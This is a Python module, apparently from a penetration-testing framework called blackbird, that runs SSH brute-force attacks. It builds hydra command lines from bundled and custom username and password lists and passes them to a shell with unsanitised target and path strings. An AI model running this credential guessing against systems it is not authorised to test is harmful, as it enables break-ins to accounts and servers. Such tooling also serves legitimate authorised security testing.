from blackbird import utils
from blackbird import config
from blackbird.core.module import Module


class ModuleInstance(Module):

    def __init__(self, target, port, service, nmap_results, output_dir, proto):
        Module.__init__(self, target, port, service, nmap_results, output_dir, proto)


    def can_run(self):
        if self.proto == 'tcp' and (self.service == 'ssh'):
            return True
        return False


    def enum(self):
        return


    def do_bruteforce(self, outfile, user_list=None, pass_list=None, userpass_list=None):
        if user_list and pass_list:
            cmd = "hydra -t 4 -v -L %s -P %s -I -e nsr -f ssh://%s:%s|tee %s" % (user_list, pass_list, self.target, self.port, outfile)
        elif userpass_list:
            cmd = "hydra -t 4 -v -C %s -I -e nsr -f ssh://%s:%s|tee %s" % (userpass_list, self.target, self.port, outfile)
        utils.run_cmd(cmd)


    def brute(self):
        utils.log('Starting SSH bruteforce against %s:%s' % (self.target, self.port), 'info')
        user_list = self.get_ressource_path('ssh_usernames.txt')
        pass_list = self.get_ressource_path('ssh_passwords.txt')
        userpass_list = self.get_ressource_path('ssh_userpass.txt')
        outfile = self.get_output_path('brute.txt')
        if not config.ONLY_CUSTOM_BRUTE:
            self.do_bruteforce(outfile, user_list=user_list, pass_list=pass_list)
            self.do_bruteforce(outfile, userpass_list=userpass_list)
        if config.CUSTOM_USER_LIST:
            outfile = self.get_output_path('brute_custom1.txt')
            self.do_bruteforce(outfile, user_list=config.CUSTOM_USER_LIST, pass_list=config.CUSTOM_PASS_LIST)
        if config.CUSTOM_USERPASS_LIST:
            outfile = self.get_output_path('brute_custom2.txt')
            self.do_bruteforce(outfile, userpass_list=config.CUSTOM_USERPASS_LIST)
